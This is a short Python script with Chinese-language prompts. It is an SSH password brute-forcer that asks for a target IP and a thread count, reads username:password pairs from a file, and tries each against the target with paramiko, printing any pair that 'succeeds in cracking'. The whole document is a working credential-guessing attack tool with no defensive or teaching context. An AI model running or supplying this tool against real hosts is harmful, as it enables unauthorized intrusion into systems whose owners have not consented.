import paramiko
import threading
from queue import Queue

def ssh_connect(host, username, password, port=22):
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(host, port=port, username=username, password=password, timeout=5)
        print(f"[+] 成功破解: {username}:{password}")
        ssh.close()
        return True
    except:
        return False

def worker():
    while True:
        credential = queue.get()
        username, password = credential.split(':')
        if ssh_connect(target, username, password):
            queue.queue.clear()
        queue.task_done()

if __name__ == "__main__":
    target = input("输入目标IP: ")
    threads = int(input("线程数: "))
    
    queue = Queue()
    for _ in range(threads):
        t = threading.Thread(target=worker)
        t.daemon = True
        t.start()
    
    with open('passwords.txt') as f:
        for line in f:
            queue.put(line.strip())
    
    queue.join()